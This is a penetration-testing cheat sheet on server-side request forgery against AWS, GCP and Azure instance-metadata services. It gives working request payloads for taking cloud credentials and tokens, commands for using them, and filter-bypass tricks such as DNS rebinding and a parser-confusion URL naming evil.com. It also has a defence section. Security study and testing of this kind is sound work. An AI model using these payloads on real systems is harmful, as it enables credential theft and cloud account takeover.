# Cloud Metadata SSRF

> Server-Side Request Forgery chained into the instance-metadata service (IMDS) of AWS / GCP / Azure / Alibaba / DO yields short-lived IAM/SA tokens. Authorized testing only.

## TL;DR
- Every major cloud has a non-routable metadata endpoint at `169.254.169.254` (link-local). SSRF that lets the server fetch arbitrary URLs reaches it.
- AWS IMDSv1: any HTTP GET returns secrets. IMDSv2 requires a PUT-issued session token first + `X-aws-ec2-metadata-token` header on subsequent GETs + a hop-limit guard.
- GCP requires `Metadata-Flavor: Google` header — any SSRF that proxies request bodies but not headers usually misses this; SSRF that forwards headers gets it.
- Azure requires `Metadata: true` header — same header gotcha as GCP.
- Defence is layered: enforce IMDSv2 / hop-limit / header-required IMDS, deny outbound to 169.254/16 from compute that doesn't need it, use a DNS-rebinding-safe HTTP fetcher.

## Provider endpoints

| Provider | Endpoint | Special header | Token endpoint |
| --- | --- | --- | --- |
| **AWS IMDSv1** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | — | n/a |
| **AWS IMDSv2** | same | `X-aws-ec2-metadata-token: <tok>` | `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600` |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` | n/a (token returned directly) |
| **Azure** | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=<aud>` | `Metadata: true` | n/a |
| **Alibaba** | `http://100.100.100.200/latest/meta-data/` | — | role-arn endpoint similar to AWS |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | — | n/a (no creds, but droplet metadata + user-data) |

`metadata.google.internal` and `169.254.169.254` resolve identically on GCP — DNS-resolver SSRF filters that block IPs without resolving the hostname miss it.

## Detection / Discovery
- Probe likely SSRF sinks (URL-fetcher webhooks, image-conversion, PDF rendering, OAuth `redirect_uri` open-redirect chains, server-side `<img>` rendering, screenshot services, RSS reader, fetch-from-URL features in dashboards).
- Use a per-request unique Burp Collaborator URL — confirm DNS hit and then in-band reads.

## Exploitation

### AWS — IMDSv2 chained from SSRF
SSRF must support arbitrary headers AND request method override (PUT). PoC body for an SSRF sink that accepts `method=PUT` + headers:
```
URL=http://169.254.169.254/latest/api/token
METHOD=PUT
HEADER=X-aws-ec2-metadata-token-ttl-seconds: 21600
```
Then GET with the returned token:
```
URL=http://169.254.169.254/latest/meta-data/iam/security-credentials/
HEADER=X-aws-ec2-metadata-token: <token-from-prev>
```
Lists the role names. GET each role to get creds:
```
URL=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
HEADER=X-aws-ec2-metadata-token: <token>
```
Returns JSON with `AccessKeyId`, `SecretAccessKey`, `Token` (a session token). Export:
```bash
export AWS_ACCESS_KEY_ID=… AWS_SECRET_ACCESS_KEY=… AWS_SESSION_TOKEN=…
aws sts get-caller-identity
```
Note: if `http-put-response-hop-limit=1`, an SSRF from a containerized workload that crosses a hop usually fails.

### GCP — single-shot token request
```
URL=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
HEADER=Metadata-Flavor: Google
```
Returns `{"access_token":"ya29....","expires_in":3000,"token_type":"Bearer"}` — use immediately:
```bash
curl -H "Authorization: Bearer ya29..." https://cloudresourcemanager.googleapis.com/v1/projects
```
Other juicy endpoints under `/computeMetadata/v1/instance/`:
- `attributes/ssh-keys` (when SSH metadata is populated)
- `attributes/startup-script` (often has secrets)
- `service-accounts/default/scopes`
- `service-accounts/default/identity?audience=…` (signed JWT for impersonation)

### Azure — single-shot Managed Identity token
```
URL=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
HEADER=Metadata: true
```
Returns `{"access_token":"eyJ0…","client_id":"…","resource":"https://management.azure.com/"}`. Use:
```bash
curl -H "Authorization: Bearer eyJ0..." https://management.azure.com/subscriptions?api-version=2020-01-01
```
Other resource values to try: `https://graph.microsoft.com/`, `https://vault.azure.net/`, `https://storage.azure.com/`.

## Bypasses
- **DNS rebinding**: control a domain that returns a public IP for the first DNS lookup (passes the URL allow-list/parse), then 169.254.169.254 for the second (the actual fetch). Counter: resolver should pin the first-resolved IP for the request lifetime.
- **URL parser confusion**: `http://169.254.169.254@evil.com/` (some parsers fetch `evil.com`, others `169.254.169.254`); `http://[::ffff:a9fe:a9fe]/` (IPv6-mapped); decimal-encoded IPs (`http://2852039166/`).
- **HTTP→HTTPS redirect**: if the SSRF sink follows 30x but only validates the first URL, host a redirector that points to IMDS.
- **Inner SSRF via fetch parameter on response**: e.g., headless-browser screenshot service rendering `<img src="http://169.254.169.254/...">` — the embedded request originates from the rendering pod.

## Defence / Remediation
- **AWS**: enforce IMDSv2 (`HttpTokens=required`, `HttpPutResponseHopLimit=1`, `InstanceMetadataTags=disabled`); set the account-default to required via `aws ec2 modify-instance-metadata-defaults`. CWE-918 SSRF + CWE-200 Information Exposure.
- **GCP**: drop the *Editor* default Compute SA scope to per-instance custom SA; restrict outbound from compute to metadata via VPC firewall only where required.
- **Azure**: rely on Managed Identity (so a leaked SAS/secret isn't long-lived) but block SSRF reach to `169.254.169.254` at the OS/firewall level on workloads with user-input URL fetchers.
- **Application-level SSRF defence**:
  - Allow-list of destination hostnames (resolved once, then connect to the resolved IP).
  - Block link-local (169.254/16), private (10/8, 172.16/12, 192.168/16), loopback (127/8), and `::1`/`fe80::/10` post-resolve.
  - DNS-pin: resolve hostname → connect to the IP you resolved, not to a fresh resolution mid-redirect.
  - Disable HTTP redirects in the fetcher unless the redirect target re-passes the allow-list.
  - Use a dedicated fetcher process / namespace with no outbound except via an HTTP proxy you control.
- **Detection**: VPC flow logs / Cloud NAT logs for outbound to 169.254.169.254 from unexpected workloads. AWS GuardDuty surfaces `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS` when stolen creds are used from an external IP.

## Sources
- AWS IMDSv2 reference: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-existing-instances.html
- GCP metadata server: https://cloud.google.com/compute/docs/metadata/default-metadata-values
- Azure IMDS: https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
- PayloadsAllTheThings SSRF: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- OWASP Cheat Sheet — SSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- hackingthe.cloud — Metadata abuse: https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
- HackTricks Cloud SSRF: https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html
- CWE-918 Server-Side Request Forgery: https://cwe.mitre.org/data/definitions/918.html
